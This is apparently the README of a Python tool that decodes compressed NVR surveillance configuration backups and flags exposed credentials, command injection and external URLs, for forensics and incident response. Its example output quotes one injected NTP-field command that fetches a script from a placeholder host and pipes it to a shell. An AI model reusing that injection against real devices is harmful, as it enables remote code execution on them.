# NVR Config Decoder

A Python tool for decoding compressed configuration files from Network Video Recorder (NVR) systems with NVHR header format.

## Overview

This tool was developed to decode `.bak` configuration files that use a proprietary NVHR header format with zlib compression. It can extract and analyze configuration data from surveillance NVR systems.

## Features

- **Header Detection**: Automatically detects NVHR header format
- **Zlib Decompression**: Handles zlib-compressed configuration data
- **Flexible Offset Handling**: Tries multiple offsets if standard decompression fails
- **Security Analysis**: Built-in analysis to detect:
  - Exposed credentials (usernames/passwords)
  - Potential command injection attempts
  - External URLs and suspicious entries
- **Command Line Interface**: Easy-to-use CLI with multiple options

## Installation

No special installation required. Just ensure you have Python 3.x installed.

```bash
git clone https://github.com/random-robbie/nvr_decoder.git
cd nvr_decoder
chmod +x nvr_config_decoder.py
```

## Usage

### Basic Usage

```bash
# Decode a config file
python3 nvr_config_decoder.py config.bak

# Decode with security analysis
python3 nvr_config_decoder.py config.bak -a

# Specify custom output file
python3 nvr_config_decoder.py config.bak -o decoded_config.txt -a

# Show more preview text
python3 nvr_config_decoder.py config.bak -p 1000
```

### Command Line Options

```
usage: nvr_config_decoder.py [-h] [-o OUTPUT] [-a] [-p PREVIEW] input

Decode NVR configuration files

positional arguments:
  input                 Input .bak file to decode

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        Output file for decoded config
  -a, --analyze         Perform security analysis on decoded config
  -p PREVIEW, --preview PREVIEW
                        Number of characters to preview (default: 500)
```

## File Format

The tool handles files with the following structure:
- **Header**: NVHR1.03 followed by metadata (first 20 bytes)
- **Compressed Data**: zlib-compressed configuration starting at offset 0x14

## Security Analysis Features

The built-in security analysis will flag:

- **Credentials**: Exposed usernames and passwords
- **Command Injection**: Suspicious shell commands or script execution
- **External URLs**: HTTP/HTTPS URLs pointing to external systems
- **Malicious Entries**: Common indicators of compromise

## Example Output

```
Decoding: config.bak
Output: config.txt
--------------------------------------------------
File size: 3472 bytes
Header: b'NVHR1.03\x80\r\x00\x00\xdb\x95\x95\x89mH\x00\x00'
SUCCESS - Decompressed 18541 bytes
Saved to: config.txt

=== SECURITY ANALYSIS ===
SECURITY CONCERNS FOUND:
  ⚠️  Line 614: Username found - (username(user))
  ⚠️  Line 615: Password found - (password(password123))
  ⚠️  Line 659: Potential command injection - (ntp($&28;curl http://malicious-ip/script.sh -o- | sh&29;))
  ⚠️  Line 659: External URL - (ntp($&28;curl http://malicious-ip/script.sh -o- | sh&29;))
```

## Common Use Cases

- **Forensic Analysis**: Extracting configuration data from compromised NVR systems
- **Security Assessment**: Identifying hardcoded credentials and security misconfigurations
- **System Recovery**: Recovering configuration from backup files
- **Incident Response**: Analyzing potentially compromised surveillance systems

## Supported Systems

This tool has been tested with:
- Various NVR systems using NVHR configuration format
- Files with NVHR1.03 headers
- zlib-compressed configuration data

## Security Notice

⚠️ **Important**: Always handle configuration files securely as they may contain:
- Plain-text passwords
- Network credentials
- System configuration details
- Potentially malicious content

## Contributing

Feel free to submit issues or pull requests for improvements or additional NVR format support.

## License

This project is provided as-is for educational and security research purposes.